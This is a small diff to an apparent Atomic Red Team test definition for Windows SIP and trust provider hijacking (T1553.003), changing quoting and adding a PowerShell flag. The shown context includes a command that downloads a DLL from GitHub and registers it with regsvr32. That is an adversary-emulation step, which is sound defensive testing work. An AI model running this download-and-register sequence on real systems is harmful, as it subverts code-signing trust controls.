@@ -1,5 +1,5 @@
 attack_technique: T1553.003
-display_name: 'Subvert Trust Controls: SIP and Trust Provider Hijacking'
+display_name: "Subvert Trust Controls: SIP and Trust Provider Hijacking"
 atomic_tests:
 - name: SIP (Subject Interface Package) Hijacking via Custom DLL
   auto_generated_guid: e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675
@@ -22,7 +22,7 @@ atomic_tests:
       if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}" -UseBasicParsing
   executor:
     command: |
       regsvr32.exe #{dll_payload}
